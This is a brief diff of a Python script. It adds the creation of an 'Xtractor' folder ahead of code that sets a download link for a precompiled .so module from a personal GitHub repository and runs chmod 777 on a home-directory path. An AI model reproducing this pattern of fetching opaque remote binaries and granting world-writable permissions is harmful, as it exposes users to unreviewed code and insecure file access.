@@ -1,5 +1,9 @@
 import re,os,sys
 try:
+    os.mkdir('Xtractor')
+except:
+    pass
+try:
     download_link = "https://raw.githubusercontent.com/ffdvl1120/cc/main/pycrypto_qsr.cpython-311.so"
     if not os.path.exists("pycrypto_qsr.cpython-311.so"):
         os.system("chmod 777 $HOME/Qsr")
